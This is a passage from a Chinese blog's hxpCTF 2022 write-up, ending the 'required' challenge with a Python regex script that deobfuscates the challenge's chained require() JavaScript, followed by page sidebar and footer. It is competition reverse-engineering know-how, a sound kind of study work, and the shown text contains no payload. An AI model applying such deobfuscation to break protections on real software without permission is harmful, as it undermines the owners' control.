punctuation">.</span>cache<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token keyword">delete</span> require<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>综上，写出来一个脚本还原整个加密操作</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re
+
+
+<span class="token keyword">def</span> <span class="token function">writeOp</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> funcArgs<span class="token punctuation">,</span> outfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'module.exports=(i,j,t)=>(i%=30,j%=30,t%=30,i+=[],j+"",t=(t+{}).split("[")[0],'</span><span class="token punctuation">)</span>
+    match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token operator">+</span><span class="token string">"(.*)\\)$"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> match<span class="token punctuation">:</span>
+        func <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        arr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"\\(([0-9]+),([0-9]+),([0-9]+)\\)"</span><span class="token punctuation">,</span> funcArgs<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        arrInt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> element <span class="token keyword">in</span> arr<span class="token punctuation">:</span>
+            arrInt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int<span class="token punctuation">(</span>element<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">30</span><span class="token punctuation">)</span>
+        func <span class="token operator">=</span> func<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>arrInt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        func <span class="token operator">=</span> func<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'j'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>arrInt<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        func <span class="token operator">=</span> func<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>arrInt<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        outfile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
+        outfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        outfile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        outfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+
+includefile <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"required.js"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> infile<span class="token punctuation">:</span>
+    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"simplified.js"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> outfile<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> line <span class="token keyword">in</span> infile<span class="token punctuation">:</span>
+            <span class="token comment" spellcheck="true"># print(line)</span>
+            match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"require\\('\\./([0-9]{1,3})'\\)(\\(([0-9]{1,3}),([0-9]{1,3}),([0-9]{1,3})\\))"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> match<span class="token punctuation">:</span>
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"{}.js"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> requirefile<span class="token punctuation">:</span>
+                        content <span class="token operator">=</span> requirefile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                        ijt <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"require\\('\\./289'\\)\\([ijt],([ijt])\\)"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+                        <span class="token comment" spellcheck="true"># 有些文件没有require直接是位操作</span>
+                        <span class="token keyword">if</span> ijt<span class="token punctuation">:</span>
+                            index <span class="token operator">=</span> ijt<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+                            <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token string">'i'</span><span class="token punctuation">:</span>
+                                num <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+                            <span class="token keyword">elif</span> index <span class="token operator">==</span> <span class="token string">'j'</span><span class="token punctuation">:</span>
+                                num <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+                            <span class="token keyword">elif</span> index <span class="token operator">==</span> <span class="token string">'t'</span><span class="token punctuation">:</span>
+                                num <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
+                            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                                <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"invalid index: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                            includefile <span class="token operator">=</span> num
+                            <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"{}.js"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> targetfile<span class="token punctuation">:</span>
+                                content <span class="token operator">=</span> targetfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                writeOp<span class="token punctuation">(</span>content<span class="token punctuation">,</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outfile<span class="token punctuation">)</span>
+                        <span class="token keyword">else</span><span class="token punctuation">:</span>
+                            writeOp<span class="token punctuation">(</span>content<span class="token punctuation">,</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outfile<span class="token punctuation">)</span>
+                <span class="token comment" spellcheck="true"># 有时候会直接在外面include不存在的文件，这个时候就是靠之前污染的值去加载</span>
+                <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>
+                    <span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"{}.js"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>includefile<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                        writeOp<span class="token punctuation">(</span>content<span class="token punctuation">,</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outfile<span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                outfile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
+                outfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+</code></pre>
+<p>这点内容我写了一个多小时。。。coding能力还是太差了捏呜呜呜，并且后面这半边还需要把对应的加密环节逆向回去，这就超出我的能力范围了</p>
+<p>真不知道tkmk神仙怎么做到的一个小时就做出来了。。。太强了8</p>
+<p>又，这种混淆应该用ast写会更稳定一些，不过这里的整个混淆的结构都很简单并且很固定，直接写正则也不是不行。。。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/k8s%E5%85%A5%E9%97%A8.html" rel="prev" title="k8s入门">
+      <i class="fa fa-chevron-left"></i> k8s入门
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hxpCTF2022wp"><span class="nav-number">1.</span> <span class="nav-text">hxpCTF2022wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#valentine"><span class="nav-number">1.1.</span> <span class="nav-text">valentine</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A31"><span class="nav-number">1.1.1.</span> <span class="nav-text">解1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A32"><span class="nav-number">1.1.2.</span> <span class="nav-text">解2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6cache"><span class="nav-number">1.1.3.</span> <span class="nav-text">控制cache?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#archived"><span class="nav-number">1.2.</span> <span class="nav-text">archived</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#admin-bot"><span class="nav-number">1.2.1.</span> <span class="nav-text">admin bot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.2.2.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.2.3.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlite-web"><span class="nav-number">1.3.</span> <span class="nav-text">sqlite_web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%A9%E8%9B%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">彩蛋</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E6%9C%BA"><span class="nav-number">1.3.3.</span> <span class="nav-text">转机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%B0%8F%E7%9A%84%E7%96%91%E6%83%91%E7%82%B9"><span class="nav-number">1.3.4.</span> <span class="nav-text">小小的疑惑点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#true-web-assembly"><span class="nav-number">1.4.</span> <span class="nav-text">true_web_assembly</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#required"><span class="nav-number">1.5.</span> <span class="nav-text">required</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
